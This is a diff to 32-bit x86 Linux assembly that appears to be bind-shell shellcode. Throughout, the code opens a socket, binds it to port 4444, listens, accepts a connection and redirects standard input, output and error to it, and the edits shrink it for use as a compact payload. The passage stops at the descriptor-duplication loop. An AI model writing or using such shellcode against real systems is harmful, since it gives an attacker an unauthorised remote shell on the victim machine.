@@ -7,37 +7,35 @@ global _start
 section .text
 
 _start:
-	xor	eax, eax
 	xor	ebx, ebx
-	xor	ecx, ecx
-	xor	edx, edx
+	mul	ebx
 
 	;listenfd=socket(AF_INET, SOCK_STREAM, 0)
 	mov	al, 0x66
-	mov	bl, 0x1
+	inc	ebx
 	push	edx
-	push	0x1
+	push	ebx
 	push	0x2
 	mov	ecx, esp
 	int	0x80
-	mov	ebp, eax
 
 	;bind(listenfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr))
-	mov	al, 0x66
-	mov	bl, 0x2
+	pop	ebx
 	push	edx
-	push	word 0x115c
+	push	word 0x5c11
 	push	bx
 	mov	ecx, esp
 	push	0x10
 	push	ecx
-	push	ebp
+	push	eax
 	mov	ecx, esp
+	mov	ebp, eax
+	mov	al, 0x66
 	int	0x80
 
 	;listen(listenfd, 1)
 	mov	al, 0x66
-	mov	bl, 0x4
+	add	ebx, ebx
 	push	0x1
 	push	ebp
 	mov	ecx, esp
@@ -45,7 +43,7 @@ _start:
 
 	;connfd=accept(listenfd, (struct sockaddr*)NULL, NULL)
 	mov	al, 0x66
-	mov	bl, 0x5
+	inc	ebx
 	push	edx
 	push	edx
 	push	ebp
@@ -53,7 +51,7 @@ _start:
 	int	0x80
 
 	;dup2(connfd, 2); dup2(connfd, 1); dup2(connfd, 0);
-	mov	ebx, eax
+	xchg	ebx, eax
 	xor	ecx, ecx
 	mov	cl,0x3
 dupfd:
